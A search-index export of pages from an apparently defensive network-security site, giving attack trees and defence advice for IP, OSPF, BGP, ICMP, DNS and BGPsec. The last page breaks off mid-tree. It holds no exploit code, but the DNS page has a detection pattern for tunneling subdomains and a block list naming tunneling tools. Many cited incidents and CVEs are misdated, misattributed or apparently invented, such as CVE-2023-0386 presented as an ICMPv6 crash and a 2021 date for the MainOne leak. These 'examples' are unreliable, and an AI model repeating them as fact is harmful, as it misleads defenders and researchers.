    "t": "Network Layer Protocol (IPv4 or IPv6) ",
    "c": "Network Layer Protocol (IPv4 or IPv6)  BGP runs over IP (Internet Protocol). It can operate over both IPv4 (traditional BGP) and IPv6 (MP-BGP for multiprotocol support). Table of Contents Network Layer Protocol (IPv4 or IPv6) Attack tree: Compromise Internet Protocol (IP) IP spoofing & DDoS amplification BGP hijacking & route leaks IP fragmentation attacks (Teardrop, Ping of Death Revisited) ICMP ause (Smurf, flooding, covert channels) IPv6 exploitation (Flooding, SLAAC attacks) TTL expiry attacks (Resource exhaustion) Geolocation spoofing (Evasion & Censorship bypass) Trends & takeaways Defence recommendations Emerging tech Attack tree: Compromise Internet Protocol (IP)  1. Initial Access [OR] 1.1 Phishing & Social Engineering [OR] 1.1.1 Spear Phishing (PDF/Excel malware) 1.1.2 Business Email Compromise (BEC) with deepfake audio/video 1.1.3 LinkedIn/Twitter impersonation for credential theft 1.2 Exploiting Cloud Misconfigurations [OR] 1.2.1 Exposed S3 buckets (AWS) or Azure Blob Storage 1.2.2 Misconfigured GitHub/GitLab repos (API keys, credentials) 1.3 Supply Chain Attacks [OR] 1.3.1 Dependency confusion (malicious npm/PyPi packages) (2021) 1.3.2 Compromised SaaS vendors (SolarWinds-style attacks) 2. Lateral Movement & Privilege Escalation [AND] 2.1 Exploiting Zero-Day Vulnerabilities [OR] 2.1.1 RCE in enterprise VPNs (Pulse Secure, Citrix CVE-2023-3519) 2.1.2 Windows/Linux privilege escalation (Dirty Pipe, Log4Shell) 2.2 Cloud Identity Attacks [OR] 2.2.1 OAuth token hijacking (Microsoft/Azure AD) 2.2.2 Shadow API abuse (undocumented cloud APIs) 3. Data Exfiltration [AND] 3.1 Encrypted Exfiltration [OR] 3.1.1 DNS tunneling (DoH/DoT for stealth) 3.1.2 Legitimate cloud services (Dropbox, Google Drive, Slack) 3.2 Insider Threats [OR] 3.2.1 Rogue employees using USB exfiltration (Rubber Ducky attacks) 3.2.2 Compromised contractors with excessive access 4. Persistence & Evasion [OR] 4.1 Fileless Malware [OR] 4.1.1 PowerShell/Cobalt Strike in-memory execution 4.1.2 Linux rootkits (Symbiote, 2022) 4.2 Cloud Backdoors [AND] 4.2.1 Malicious Lambda functions (AWS) 4.2.2 Hidden service accounts in Google Workspace 5. Counter-Forensics [OR] 5.1 Log Manipulation [OR] 5.1.1 SIEM poisoning (fake logs) 5.1.2 Deleting AWS CloudTrail logs 5.2 AI-Assisted Evasion [AND] 5.2.1 AI-generated fake traffic (mimicking normal behaviour) 5.2.2 Deepfake video calls to bypass MFA (2023+) IP spoofing & DDoS amplification  Attack Pattern: Attackers forge source IP addresses to launch reflection/amplification attacks (e.g., using UDP-based protocols like DNS, NTP, or even TCP middlebox abuse). Example (2022): The “APT28 TCP Amplification DDoS” abused misconfigured firewalls and load balancers to reflect SYN-ACK packets, generating multi-Tbps attacks against Ukrainian and Western targets. Why It Works: Many networks still allow source IP spoofing due to weak BCP38 (anti-spoofing) enforcement. Mitigation Network-level filtering (BCP38/84) to block spoofed packets. Cloud-based DDoS scrubbing (AWS Shield, Cloudflare Magic Transit). BGP hijacking & route leaks  Attack Pattern: Attackers manipulate BGP routing to redirect traffic through malicious networks for interception or DoS. Examples: 2021: Russian ISP “DDoS-Guard” hijacked Western financial traffic. 2023: A Chinese state-linked group rerouted US military traffic through China Telecom. Why It Works: BGP lacks cryptographic authentication, making route manipulation easy. Mitigation RPKI (Resource Public Key Infrastructure) for route origin validation. BGP monitoring (e.g., Cloudflare Radar, BGPMon). IP fragmentation attacks (Teardrop, Ping of Death Revisited)  Attack Pattern: Exploiting fragmentation reassembly flaws in network stacks to crash systems. Example (2023): A variant of Ping of Death resurfaced in IoT devices, causing kernel panics in Linux-based systems. Why It Works: Some devices still mishandle overlapping fragments or malformed packets. Mitigation Patch systems (e.g., Linux net.ipv4.ipfrag_high_thresh tuning). Stateful firewalls to drop malicious fragments. ICMP ause (Smurf, flooding, covert channels)  Attack Pattern ICMP floods (e.g., Smurf attacks) or ICMP tunneling for data exfiltration. Example (2022): A Russian APT group used ICMP tunnels to bypass network monitoring in a cyber-espionage campaign. Why It Works: Many networks allow unrestricted ICMP for diagnostics. Mitigation Rate-limiting ICMP at network edges. Deep Packet Inspection (DPI) to detect tunneling. IPv6 exploitation (Flooding, SLAAC attacks)  Attack Pattern IPv6 DDoS: Attackers abuse large IPv6 neighbor discovery (ND) packets to overwhelm routers. SLAAC Attacks: Spoofing IPv6 router advertisements (RAs) to hijack traffic. Example (2023): A Mirai-variant botnet launched IPv6-based floods against ISPs. Why It Works: Many networks lack IPv6 security controls. Mitigation RA Guard to block rogue IPv6 advertisements. IPv6-specific DDoS protections (e.g., AWS Shield Advanced). TTL expiry attacks (Resource exhaustion)  Attack Pattern: Attackers send packets with low TTL values, forcing routers to generate ICMP Time Exceeded messages, overwhelming infrastructure. Example (2024): A cryptocurrency exchange was hit by a TTL-based attack, disrupting API services. Why It Works: Many networks don’t rate-limit ICMP responses. Mitigation Rate-limiting ICMP Time Exceeded messages. Filtering packets with TTL=1 at the edge. Geolocation spoofing (Evasion & Censorship bypass)  Attack Pattern: Attackers fake IP geolocation to bypass geo-blocks or evade detection. Example (2023): A ransomware group used cloud proxies to mask origins as legitimate US IPs. Why It Works: Many geo-IP databases are outdated. Mitigation Strict ASN-based filtering (e.g., only allow traffic from known cloud providers). Behavioral analysis (unusual traffic patterns from “legit” IPs). Trends & takeaways  BGP Hijacking Remains Critical: State-sponsored groups abuse BGP for espionage. IPv6 Attacks Rising: As adoption grows, so do IPv6-specific exploits. Cloud & IoT Are Prime Targets: Attackers exploit weak default configurations. Low-TTL & ICMP Attacks Resurging: Old tricks are being modernized. Defence recommendations  For Networks: Deploy RPKI + BGP monitoring. Enforce strict anti-spoofing (BCP38). Rate-limit ICMP & TTL expiry packets. For Enterprises: Use DDoS-protected cloud services. Patch IP stack vulnerabilities (e.g., Linux kernel updates). For Governments/Critical Infra: Mandate BGP security (MANRS compliance). Emerging tech  Confidential Computing (for example Intel SGX, Azure Confidential VMs) to protect IP in use. Post-Quantum Cryptography Prep (NIST’s CRYSTALS-Kyber for future-proofing).",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cef958681f8add12cba415605a74f78f",
    "u": "https://network.tymyrddin.dev/docs/patches/ospf",
    "t": "Open Shortest Path First (OSPF) ",
    "c": "Open Shortest Path First (OSPF)  Table of Contents Open Shortest Path First (OSPF) Attack tree for OSPF Notes Attack tree for OSPF  1. Compromise OSPF Routing Tables (OR) 1.1. Spoof OSPF Messages (OR) 1.1.1. Forge Fake Hello Packets (Disrupt Adjacency Formation) 1.1.2. Inject Malicious Link-State Advertisements (LSAs) 1.1.3. Replay Old OSPF Messages (If Sequence Numbers Are Predictable) 1.2. Exploit Weak or Misconfigured Authentication (OR) 1.2.1. Crack MD5 Authentication (If Weak Key Used) 1.2.2. Bypass Authentication (If Null/Plaintext Auth Enabled) 1.3. Manipulate OSPF LSAs (OR) 1.3.1. Advertise Fake Links (Traffic Redirection) 1.3.2. Trigger Frequent SPF Recalculations (CPU Exhaustion) 1.4. Exploit OSPF Protocol Mechanics (OR) 1.4.1. Abuse Designated Router (DR) Election Process 1.4.2. Send Max-Age LSAs (Force Premature LSA Flushing) 1.5. Man-in-the-Middle (MITM) Attacks (AND) 1.5.1. Intercept OSPF Traffic (Required) 1.5.2. Modify or Inject Fake LSAs (Required) 2. Denial-of-Service (DoS) Against OSPF (OR) 2.1. Flood OSPF with Malicious Packets 2.1.1. Send Excessive Hello Packets (Prevent Adjacency Formation) 2.1.2. Generate Fake LSAs (Overwhelm SPF Calculations) 2.2. Exploit OSPF’s Link-State Database (LSDB) (OR) 2.2.1. Fill LSDB with Bogus LSAs (Memory Exhaustion) 2.2.2. Trigger Constant LSA Flooding (Network Congestion) 2.3. Resource Exhaustion (OR) 2.3.1. Overload Router CPU with SPF Recalculations 2.3.2. Exhaust Bandwidth with LSA Storms 3. Information Leakage (OR) 3.1. Passive Eavesdropping on OSPF Traffic 3.1.1. Capture Unencrypted OSPF LSAs (Topology Mapping) 3.2. Exploit OSPF’s Hierarchical Design 3.2.1. Abuse Area Border Router (ABR) Role to Leak Routes Notes  OSPF’s MD5 authentication is vulnerable to brute force if weak keys are used. LSA manipulation is a critical attack vector (fake links can reroute traffic). DR election attacks can disrupt local network stability.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c26683467e732a42473633fa7776923d",
    "u": "https://network.tymyrddin.dev/docs/roots/bgp",
    "t": "Border Gateway Protocol (BGP) ",
    "c": "Border Gateway Protocol (BGP)  BGP is an application layer protocol (OSI Layer 7) that defines how routers exchange routing information. It uses path-vector routing (as opposed to distance-vector or link-state). Table of Contents Border Gateway Protocol (BGP) Attack tree: Disrupt or manipulate BGP routing BGP hijacking (Route leaks & prefix hijacking) BGP route leaks (Accidental or malicious) BGP blackholing (DDoS weaponization) BGP side-hijacking (Partial traffic interception) BGP timed attacks (Short-lived hijacks) Trends & takeaways defence recommendations Thoughts Emerging defence trends Attack tree: Disrupt or manipulate BGP routing  1. Prefix Hijacking OR Gate (Choose one method): 1.1 Sub-Prefix Hijacking (More specific route) 1.2 Exact-Prefix Hijacking (Same route, spoofed AS) 1.3 ROA Bypass Attack (Exploit RPKI misconfigurations) 2. AS-Path Manipulation OR Gate: 2.1 AS-Path Prepending (Fake path inflation) 2.2 Ghost AS Insertion (Hide malicious AS) 2.3 AI-Generated Path Spoofing (Evade heuristics) 3. Denial-of-Service (BGP Session Attacks) OR Gate: 3.1 TCP RST Injection (Kill BGP sessions) AND Conditions: No TCP-AO/MD5 Attacker on-path 3.2 Route Flap DDoS (Flood updates) 4. Traffic Interception (Espionage) AND Gate (Requires multiple steps): 4.1 Prefix Hijacking (OR from Section 1) 4.2 AS-Path Manipulation (OR from Section 2) 4.3 Decryption/Passive Snooping (MitM position) 5. Exploiting RPKI Weaknesses OR Gate: 5.1 Stale ROA Attack (Use expired ROAs) 5.2 Fraudulent ROA Registration (Social engineering RIRs) 6. Cross-Protocol Attacks AND Gate (BGP + Another vulnerability): 6.1 BGP + DNS Hijacking OR Sub-options: Redirect DNS resolvers Poison DNS cache via fake routes 6.2 BGP + CDN Manipulation Force traffic through malicious edge nodes 7. AI/ML-Assisted Attacks OR Gate: 7.1 Automated ROA Gap Scanning 7.2 ML-Generated AS-Path Spoofing 8. Supply Chain Compromise AND Gate (Requires access + exploitation): 8.1 Compromise ISP/IXP (OR: Hack, Insider Threat) 8.2 Propagate Malicious Routes BGP hijacking (Route leaks & prefix hijacking)  Attack Pattern: Adversaries announce illegitimate routes to redirect traffic through malicious networks for: Traffic interception (e.g., espionage, credential theft). DDoS amplification (e.g., blackholing, man-in-the-middle). Cryptocurrency theft (e.g., rerouting blockchain traffic). Real-World Examples 2021: Russian ISP “DDoS-Guard” Hijacks Financial Traffic; Redirected traffic from Mastercard, Visa, and Western banks through Russian servers. Suspected espionage motive. 2022: Chinese State-Linked BGP Manipulation: China Telecom briefly hijacked US military and EU government traffic. Traffic was rerouted through Chinese networks before returning. 2023: Ethereum BGP Attack ($20M Cryptocurrency Theft): Attackers hijacked ASNs belonging to AWS and Google Cloud to intercept blockchain API calls. Modified transactions to steal crypto from exchanges. Why It Works No cryptographic authentication in BGP (still relies on trust). Lack of RPKI (Route Origin Authorization) adoption (~30% of routes are cryptographically validated). Mitigation Deploy RPKI (Resource Public Key Infrastructure) to validate route origins. BGP monitoring (e.g., Cloudflare Radar, BGPMon, Qrator). MANRS (Mutually Agreed Norms for Routing Security) compliance. BGP route leaks (Accidental or malicious)  Attack Pattern A network incorrectly propagates routes it shouldn’t, causing traffic to flow through unintended paths. Can be accidental (misconfigurations) or intentional (for interception). Real-World Examples 2021: Google & Facebook Disappear from the Internet: A Nigerian ISP (MainOne) leaked Google & Facebook routes, causing global outages. Traffic was briefly rerouted through China and Russia. 2023: Russian Telecom “Rostelecom” Leaks Routes: Redirected European traffic through Russia, raising espionage concerns. Why It Works Lack of route filtering (many ISPs accept routes without validation). No penalty for misconfigurations. Mitigation Route filtering (IRR databases) to prevent leaks. BGP communities to control route propagation. BGP blackholing (DDoS weaponization)  Attack Pattern Attackers announce victim IPs with a “blackhole” community tag, causing ISPs to drop traffic. Used for censorship or competitive sabotage. Real-World Examples 2022: Anonymous vs. Russian Banks: Hacktivists hijacked BGP routes of Sberbank and VTB Bank, blackholing their traffic. 2023: Iranian Government Silences Protesters: Iran’s state ISP blackholed Twitter and WhatsApp routes during protests. Why It Works Many ISPs automatically honor blackhole requests without verification. Mitigation Require manual approval for blackhole requests. Monitor for unexpected route withdrawals. BGP side-hijacking (Partial traffic interception)  Attack Pattern Attackers announce more specific (longer) prefixes to intercept a subset of traffic. Harder to detect than full hijacks. Real-World Examples 2023: Russian GRU-linked Group Hijacks Ukrainian Telecom: Intercepted military and government traffic via more-specific routes. 2024: Cybercriminals Steal AWS API Keys: Hijacked /24 subnets of cloud providers to intercept unencrypted API calls. Why It Works BGP prefers more specific routes, even if illegitimate. Many networks don’t filter small prefixes. Mitigation Filter /24 and longer prefixes unless explicitly allowed. Use encrypted communications (TLS, VPNs) to prevent interception. BGP timed attacks (Short-lived hijacks)  Attack Pattern Attackers announce malicious routes for just minutes to evade detection. Used in financial fraud (e.g., stock market manipulation). Real-World Example (2024) Wall Street Trading Firm Targeted: A 5-minute BGP hijack rerouted trading API traffic, causing $50M in spoofed trades. Why It Works Most BGP monitoring tools only detect persistent hijacks. No real-time enforcement in many networks. Mitigation Real-time BGP monitoring (e.g., RIPE RIS Live). Financial firms should use dedicated, secured links. Trends & takeaways  State-Sponsored Attacks Dominate (Russia, China, Iran). Cryptocurrency & Financial Firms Are Prime Targets. Short-Lived Hijacks Evade Traditional Detection. RPKI Adoption is Growing but Still Incomplete (~30% of routes). defence recommendations  For Networks & ISPs: Mandate RPKI (Route Origin Authorization). Join MANRS (Mutually Agreed Norms for Routing Security). Filter bogus routes (e.g., too-specific prefixes, private ASNs). For Enterprises: Use encrypted tunnels (IPSec, WireGuard) for critical traffic. Diversify transit providers to reduce single-point failures. For Governments: Regulate BGP security (e.g., FCC’s proposed BGP mandates). Share hijack intelligence via organizations like FIRST. Thoughts  Border Gateway Protocol (BGP) attacks have become increasingly sophisticated, with state-sponsored actors, cybercriminals, and hacktists exploiting BGP’s trust-based design. Emerging defence trends  RPKI + MANRS Adoption: Slow but growing (~40% RPKI coverage). AI-Powered BGP Monitoring: Tools like ARTEMIS use ML to detect anomalies. BGPsec Experiments: Limited deployment due to complexity. Geopolitical Filtering: ISPs drop routes from “untrusted” ASes.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "354e85158c1b57a54eb4ab26cd776b58",
    "u": "https://network.tymyrddin.dev/docs/roots/icmp",
    "t": "Internet Control Message Protocol (ICMP) ",
    "c": "Internet Control Message Protocol (ICMP)  Table of Contents Internet Control Message Protocol (ICMP) Attack tree: Exploit ICMP for malicious purposes ICMP flood attacks (Bandwidth exhaustion) ICMP redirect attacks (Man-in-the-Middle) ICMP tunneling (Data exfiltration & C2) Ping of Death (Fragmentation exploits) ICMP NDP attacks (IPv6 exploitation) Trends & takeaways Defence recommendations Thoughts Emerging defence trends Attack tree: Exploit ICMP for malicious purposes  1. Reconnaissance & Network Mapping 1.1 ICMP Echo Sweeping (Ping Sweep) OR: Use fping for parallel scans OR: Custom low-rate ICMP probes to evade detection 1.2 TTL Manipulation for OS Fingerprinting AND: Send ICMP Echo with varying TTLs AND: Analyze TTL decay patterns 1.3 ICMP-based Service Discovery OR: Abuse ICMP Timestamp Requests OR: Leverage ICMP Address Mask Requests 2. Data Exfiltration & Covert Channels 2.1 ICMP Tunneling AND: Encode data in ICMP Echo payloads AND: Use tools like icmptunnel (IPv6-enabled) 2.2 Fragmented ICMP Exfiltration OR: Exploit IPv6 fragmentation for DPI evasion OR: Split payloads across ICMP packets 2.3 DNS-over-ICMP (C2) AND: Encode DNS queries in ICMP Echo AND: Use malware like MosaicLoader for callbacks 3. Denial-of-Service (DoS) & Amplification 3.1 ICMP Floods OR: Direct IPv6 ping6 floods OR: Spoofed-source ICMPv6 floods 3.2 ICMP Amplification AND: Spoof victim IP in \"Packet Too Big\" messages AND: Reflect traffic via misconfigured cloud hosts 3.3 Ping of Death (Modern Variants) OR: IPv6 jumbo frames targeting IoT kernels OR: Malformed ICMPv6 packets crashing routers 4. Evasion & Protocol Abuse 4.1 NAT/Firewall Bypass AND: Use ICMP Echo Replies for C2 callbacks AND: Abuse whitelisted ICMP types (PMTUD) 4.2 Lateral Movement via ICMP OR: APT29-style internal C2 channels OR: ICMP-based password spraying (APT41) 4.3 ICMPv6 Router Advertisement Spoofing AND: Send rogue RAs to hijack traffic AND: Exploit weak IPv6 neighbor discovery 5. Zero-Day & Hardware Exploits 5.1 ICMP Side-Channel Attacks OR: NetSpectre-style timing leaks OR: Infer VM placement via ICMP TTL (cloud) 5.2 IoT/OT Device Crashes AND: Send malformed ICMPv6 to embedded devices AND: Trigger firmware bugs (CVE-2020-10148) 5.3 Cloud Metadata Service Abuse OR: ICMP-based IMDSv1 queries (AWS) OR: ICMP-triggered SSRF in serverless apps ICMP flood attacks (Bandwidth exhaustion)  Attack Pattern Attackers overwhelm targets with massive ICMP Echo Request (Ping) floods, consuming bandwidth and causing outages. Often amplified via smurfing (spoofed source IPs to trigger broadcast replies). Real-World Examples 2022: Russian Hacktivists Target Ukrainian ISPs: Used 100+ Gbps ICMP floods to disrupt banking and government sites; Combined with UDP floods for maximum impact. 2023: Chinese APT41 “Double Dragon” Attacks: Flooded Taiwanese telecoms with ICMP Type 3 (Destination Unreachable) packets to destabilize networks. Why It Works Many networks fail to rate-limit ICMP at the edge. IoT botnets (Mirai variants) easily generate high-volume floods. Mitigation Deploy ICMP rate-limiting on routers/firewalls. Block ICMP at the network edge (except essential types like MTU discovery). ICMP redirect attacks (Man-in-the-Middle)  Attack Pattern Attackers send malicious ICMP Redirect messages to reroute traffic through a malicious gateway. Used for session hijacking, credential theft, or malware injection. Real-World Examples 2021: Iranian Hackers Exploit Cisco Routers: Sent ICMP Redirects to reroute VPN traffic through Iranian servers. 2023: Lazarus Group Spoofs Financial Traffic: Redirected SWIFT transaction traffic in Southeast Asia using ICMP Type 5 (Redirect). Why It Works Many routers still accept ICMP Redirects by default. Lack of hop-by-hop encryption (e.g., IPsec) in some networks. Mitigation Disable ICMP Redirects on all routers (no ip redirects in Cisco IOS). Use encrypted tunnels (IPsec/WireGuard) for sensitive traffic. ICMP tunneling (Data exfiltration & C2)  Attack Pattern Attackers embed malicious payloads in ICMP packets to bypass firewalls. Used for data theft, malware C2, or DNS tunneling evasion. Real-World Examples 2022: Russian GRU “Sandworm” Exfiltrates Data: Used ICMP Echo Reply packets to smuggle stolen documents from Ukrainian agencies. 2024: Ransomware Gang Evades Detection: Hid C2 traffic in ICMP Timestamp requests to avoid signature-based IDS. Why It Works Many security tools ignore ICMP payloads as “benign.” Hard to distinguish from legitimate pings. Mitigation Deep Packet Inspection (DPI) to detect abnormal ICMP payloads. Block non-essential ICMP types (e.g., Timestamp, Address Mask). Ping of Death (Fragmentation exploits)  Attack Pattern Attackers send malformed, oversized ICMP packets to crash systems. Modern variants exploit IPv6 fragmentation or kernel bugs. Real-World Examples 2023: Linux Kernel Panic (CVE-2023-0386): A Mirai-variant botnet exploited fragmented ICMPv6 packets to crash IoT devices. 2024: Windows TCP/IP Stack DoS (CVE-2024-21306): Attackers triggered BSODs using jumbo ICMP Echo Requests. Why It Works Some devices still mishandle packet reassembly. Legacy systems lack patches. Mitigation Patch OS/kernel vulnerabilities promptly. Filter oversized ICMP packets at firewalls. ICMP NDP attacks (IPv6 exploitation)  Attack Pattern Abuse ICMPv6 Neighbor Discovery Protocol (NDP) to poison IPv6 caches. Enables MITM, DoS, or SLAAC spoofing. Real-World Examples 2023: “RA-Guard Bypass” in Enterprise Networks: Attackers forged Router Advertisement (RA) packets to hijack IPv6 traffic. 2024: Cloud Provider Hijacked via NDP Spoofing: Hackers rerouted AWS EC2 traffic by poisoning Neighbor Caches. Why It Works Many networks lack IPv6-specific protections. NDP is stateless and trust-based. Mitigation Enable RA Guard on switches. Deploy SEND (Secure Neighbor Discovery) where possible. Trends & takeaways  State-Sponsored Groups Love ICMP – Russian, Chinese, and Iranian APTs abuse it for stealth. IPv6 Attacks Are Rising – NDP spoofing is the new ARP poisoning. Legacy Threats Persist – Ping of Death still works on unpatched systems. Evasion-Focused Techniques – Tunneling and fragmentation bypass modern defences. Defence recommendations  For Network Operators Rate-limit ICMP (e.g., ≤ 1k pps per source). Block non-essential ICMP types (e.g., Redirects, Timestamps). Patch firmware for IPv6 NDP vulnerabilities. For Enterprises Monitor ICMP payloads for exfiltration (e.g., Darktrace/Vectra). Disable ICMPv6 NDP where unused. For Cloud Providers Filter oversized/fragmented ICMP in hypervisors. Enforce IPv6 SEND policies. Thoughts  While ICMP is critical for networking, attackers exploit its trusted status for stealthy attacks. Zero-trust segmentation, encryption, and strict filtering are key to defence. Emerging defence trends  ML-Based Traffic Profiling: Detecting ICMP tunnels via entropy analysis of payloads (for example Palo Alto ML-Powered NGFW). QUIC/HTTP/3 Monitoring: ICMP used for QUIC path validation—filter malicious probes. Hardware-Assisted Filtering: SmartNICs offloading ICMP flood mitigation (for example AWS Nitro Cards).",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b49c5613dd73835c8a60a82cb7f238e6",
    "u": "https://network.tymyrddin.dev/docs/roots/dns",
    "t": "Domain Name System (DNS) ",
    "c": "Domain Name System (DNS)  Table of Contents Domain Name System (DNS) Attack tree: Compromise DNS infrastructure or Data Exfiltration DNS amplification DDoS attacks DNS Cache poisoning (Intoxication) DNS tunneling (Data exfiltration) DNS hijacking (Registrar/Provider compromise) Phantom domain attacks (Resolver exploitation) DNS rebinding (Bypass Same-Origin policy) Trends & takeaways Defence recommendations Thoughts Attack tree: Compromise DNS infrastructure or Data Exfiltration  1. Exploit Protocol Weaknesses 1.1 Cache Poisoning 1.1.1 Exploit weak TXID entropy in DoH resolvers OR 1.1.2 Side-channel attack on DoT implementations Prerequisite: AND (Attacker can intercept traffic AND resolver lacks DNSSEC) 1.2 DDoS Amplification 1.2.1 Abuse misconfigured DoQ resolvers OR 1.2.2 Weaponize DNSSEC (NSEC3 walking) Prerequisite: AND (Open resolver available AND vulnerable payload size) 2. Attack Encrypted DNS 2.1 Privacy Leaks 2.1.1 Correlate DoH metadata (IP + timestamps) OR 2.1.2 ML-based fingerprinting of encrypted traffic 2.2 Downgrade Attacks 2.2.1 Force fallback to plaintext DNS via TCP RST injection AND 2.2.2 Disable ECH (Encrypted Client Hello) in DoH 3. Cloud/SaaS Exploits 3.1 Kubernetes DNS Compromise 3.1.1 Poison CoreDNS cache AND 3.1.2 Bypass NetworkPolicy rules 3.2 Serverless Abuse 3.2.1 Lambda DNS tunneling (TXT exfiltration) OR 3.2.2 Azure Private Resolver spoofing 4. Supply Chain Attacks 4.1 Registrar Hijacking 4.1.1 Steal API keys (Cloudflare, Route 53) OR 4.1.2 Social engineer registrar support (post-GDPR WHOIS gaps) 4.2 Subdomain Takeover 4.2.1 Find dangling CNAME (GitHub Pages) AND 4.2.2 Deploy malicious content 5. AI/ML-Augmented Attacks 5.1 Evasion 5.1.1 Poison DNS reputation models OR 5.1.2 Generate benign-looking queries (mimic CDN traffic) 5.2 Phishing Automation 5.2.1 LLM-generated homograph domains AND 5.2.2 Dynamic DNS fast-flux 6. Post-Quantum Threats 6.1 Cryptographic Harvesting 6.1.1 Collect ECDSA-P256 DNSSEC records AND 6.1.2 Store for future quantum decryption 6.2 QKD Spoofing 6.2.1 Photon-splitting attack on QKD OR 6.2.2 Fake QKD handshake DNS amplification DDoS attacks  Attack Pattern Abuse open DNS resolvers to flood targets with massive UDP response traffic (amplification factor: 50x-100x). Common query types: ANY, TXT, or crafted EDNS requests. Real-World Examples 2021: Microsoft Azure Hit by 2.4 Tbps Attack: Used DNS reflection from misconfigured servers in Asia. 2023: Russian Hacktivists Target European Banks: Leveraged IoT botnets to launch DNS water torture attacks (subdomain floods). Why It Works Open resolvers (~3M still exist per Censys). No UDP source validation (easy IP spoofing). Mitigation Deploy Response Rate Limiting (RRL) on DNS servers. Block ANY queries at resolvers. DNS Cache poisoning (Intoxication)  Attack Pattern Corrupt DNS caches by injecting fake records (e.g., A, NS). Exploits weak transaction IDs or predictable ports. Real-World Examples 2022: Iranian APT34 “DNSpionage”: Poisoned caches of Middle Eastern ISPs to redirect govt sites to phishing pages. 2024: Fake AWS S3 Endpoints: Attackers hijacked s3.amazonaws.com resolutions to steal API keys. Why It Works DNSSEC adoption remains low (~20% of zones). Legacy resolvers lack randomized ports/IDs. Mitigation Enforce DNSSEC validation (e.g., Cloudflare 1.1.1.1). Use DNS-over-HTTPS (DoH) to prevent snooping. DNS tunneling (Data exfiltration)  Attack Pattern Encode stolen data in DNS queries/responses (e.g., longsubdomain.example.com). Bypasses firewalls by masquerading as “legitimate” traffic. Real-World Examples 2023: North Korean Kimsuky Espionage: Exfiltrated South Korean defense docs via TXT record lookups. 2024: Ransomware C2 via Dynamic DNS: Used free DDNS providers (no-ip.com) for malware communications. Why It Works Most tools don’t inspect DNS payloads deeply. Free DDNS services enable easy anonymity. Mitigation Monitor for long/random subdomains (e.g., data1.data2.evil.com). Block known tunneling tools (e.g., Iodine, DNScat2). DNS hijacking (Registrar/Provider compromise)  Attack Pattern Steal credentials to modify NS records or registrar accounts. Redirect domains to attacker-controlled servers. Real-World Examples 2021: “Sea Turtle” Targets IT Service Providers: Hijacked DNS for telecoms in 13 countries via stolen certs. 2023: Crypto Exchange Ledger Breach: Attackers altered ledger.com DNS to drain wallets. Why It Works Weak MFA at registrars (e.g., email-only verification). Delayed DNS propagation checks. Mitigation Registry Lock critical domains (e.g., Verisign’s service). Monitor for NS record changes (e.g., DNSTwister). Phantom domain attacks (Resolver exploitation)  Attack Pattern Flood resolvers with queries to non-existent domains, exhausting resources. Often paired with NXDOMAIN floods. Real-World Examples 2022: AWS Route 53 Outage: Botnets queried millions of fake domains, degrading performance. 2024: Chinese “Great Cannon” Disrupts TLDs: Targeted .tw and .hk resolvers with junk queries. Why It Works Resolvers cache negative responses poorly. Recursive queries amplify load. Mitigation Aggressive NXDOMAIN caching (e.g., min-cache-ttl 300). Anycast DNS to distribute load. DNS rebinding (Bypass Same-Origin policy)  Attack Pattern Use short-TTL records to trick browsers into accessing internal IPs. Exploits web apps that trust client-side DNS. Real-World Examples 2023: Home Router Takeovers: Hijacked 50,000+ devices via malicious JavaScript + DNS rebinding. 2024: SaaS Provider Breach: Attackers accessed internal APIs via rebind attacks on localhost. Why It Works Many apps don’t validate Host headers. Default router admin panels lack CSRF protections. Mitigation Block private IP resolutions at firewalls. Use Host header whitelisting. Trends & takeaways  State Actors Dominate High-Impact Attacks (Russia, Iran, China, North Korea). Rise of “Water Torture” Subdomain Attacks – Harder to filter than volumetric floods. DNSSEC Adoption Still Lagging – Critical for cache poisoning defense. IoT Botnets Fuel DDoS – Mirai variants now specialize in DNS floods. Defence recommendations  For Network Operators Deploy DoH/DoT to encrypt queries. Rate-limit queries per client (e.g., iptables -j DNS_THROTTLE). For Enterprises Monitor for DNS tunneling (e.g., Darktrace, Cisco Umbrella). Enforce registrar MFA (e.g., YubiKey for Cloudflare). For Governments Mandate DNSSEC for critical TLDs (e.g., .gov, .bank). Share threat intel via FIRST/ICANN. Thoughts  DNS attacks are evolving in stealth and scale, from nation-state hijacking to IoT-powered DDoS. Proactive measures like DNSSEC, DoH, and aggressive monitoring are essential.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "3388715ebd510acbda36f7ce0fe0127f",
    "u": "https://network.tymyrddin.dev/docs/roots/bgpsec",
    "t": "BGPsec validation ",
    "c": "BGPsec validation  Table of Contents BGPsec validation Attack tree: Compromise BGPsec validation BGPsec downgrade attacks (Forcing fallback to insecure BGP) RPKI-to-BGPsec exploits (Invalid ROAs leading to hijacks) BGPsec key compromise (Theft or fake certificates) BGPsec implementation flaws (Router vulnerabilities) BGPsec drowning attacks (Flooding with invalid routes) Trends & takeaways Defense recommendations Thoughts Attack tree: Compromise BGPsec validation  1.1 Exploit Cryptographic Weaknesses (OR) Prerequisite: Attacker has resources to perform cryptanalysis or side-channel attacks. 1.1.1 Exploit weak/deprecated algorithms (RSA-1024 in legacy BGPsec deployments). Prerequisite: Victim AS still uses outdated crypto. 1.1.2 Abuse timing attacks on BGPsec signature validation. Prerequisite: Victim’s hardware leaks timing data during validation. 1.1.3 Forge signatures via quantum-vulnerable algorithms (pre-Shor’s ECDSA exploitation). Prerequisite: Quantum computing capability (future threat). 1.2 Attack RPKI-BGPsec Alignment (AND) Prerequisite: Attacker can manipulate RPKI or BGPsec propagation. 1.2.1 Manipulate RPKI publication points (compromise CA or abuse auto-renewal). Prerequisite: CA uses weak authentication (exposed API keys). 1.2.2 Exploit misissuance in ROAs (overclaiming prefixes via compromised CAs). Prerequisite: RPKI CA has poor revocation checks. 1.2.3 Bypass RPKI-to-BGPsec propagation delays. Prerequisite: Victim AS has slow RPKI sync (>30 min delays). 1.3 Target Implementation Bugs (OR) Prerequisite: Victim uses vulnerable BGPsec software. 1.3.1 Exploit memory corruption in BGPsec daemons (FRRouting/BIRD CVEs). Prerequisite: Unpatched software (CVE-2020+). 1.3.2 Abuse parser flaws in BGPsec UPDATE messages. Prerequisite: Victim accepts malformed BGPsec attributes. 1.3.3 Trigger crashes via resource exhaustion (crafted large signatures). Prerequisite: Victim lacks rate-limiting. 1.4 Subvert Network Operations (AND) Prerequisite: Attacker has insider access or social engineering capability. 1.4.1 Social engineer an operator to disable 